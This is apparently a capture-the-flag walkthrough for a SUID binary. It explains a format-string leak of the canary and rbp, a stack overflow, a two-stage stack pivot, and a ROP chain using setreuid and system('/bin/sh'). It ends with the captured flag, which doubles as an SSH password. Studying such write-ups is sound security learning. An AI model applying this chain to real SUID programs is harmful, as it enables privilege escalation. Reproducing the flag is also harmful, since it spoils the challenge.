# level08 — walkthrough

**Binary:** `/home/level08/maelcum` (SUID `flag08`, x86-64) — **no source, reversed**
**Goal:** read `/home/flag08/.pass`

## 1. Recon
```
checksec: No PIE (0x400000), NX ON, stack canary, ASLR off.
main: init_routing(); print_banner(); add_route()x2; relay_status(); relay_data(); print_routes();
```

## 2. Bugs
* **`relay_status`** — `read(buf@rbp-0x50,0x3f); ...; printf(buf);` : format string.
  Leaks the **canary** (`%17$`) and **main's rbp** (`%18$`).
* **`relay_data`** — `read(buf@rbp-0x30, 0x40)` : 64 bytes into a buffer only
  `0x28` (40) from the canary → overflow of the canary/saved-rbp/return. It also
  handles `RELAY:<n>` by `read()`-ing `n` bytes into the global `relay_buf`
  (.bss @ 0x404200).

## 3. The tricky part — two pivots
The overflow only reaches the return address, so there's no room for a chain on
the stack. Options and the catch:
1. Put the ROP chain in `relay_buf` (.bss) via `RELAY`, and pivot into it with a
   `leave;ret` gadget (`saved rbp = relay_buf-8`, `return = leave;ret`).
2. **But** calling `system()` with `rsp` inside the tiny `.bss` segment crashes —
   `do_system` needs a real multi-KB stack and walks off the writable segment.

So the `.bss` chain does `setreuid(1025,1025)`, then `pop rsp` **back to a real
stack**: a landing pad `[pop_rdi, "/bin/sh", ret, system]` we planted in
relay_data's own buffer. relay_data's buffer is `main_rbp - 0x50`
(frame-constant), taken from the leaked `main_rbp`.

## 4. Layout
```
relay_data overflow (64B):
  [ "RELAY:80" ][ pop_rdi, binsh, ret, system ][ canary ][ relay_buf-8 ][ leave;ret ]
    offset 0      offset 8 (landing pad)         off 40    off 48         off 56

RELAY read -> relay_buf (.bss):
  [ pop_rdi, 1025, pop_rsi_j, 1025, 3xfiller, setreuid, pop_rsp, landing ]
```
Flow: relay_data ret → leave;ret pivots into .bss → setreuid → `pop rsp` →
landing pad (real stack) → `system("/bin/sh")`, aligned.

## 5. Run
```
python3 exploit.py
-> l3w1pdvtlapo1nmo8uttd1m0pen4iiuk
```

**flag08 = `l3w1pdvtlapo1nmo8uttd1m0pen4iiuk`** (SSH password for level09)
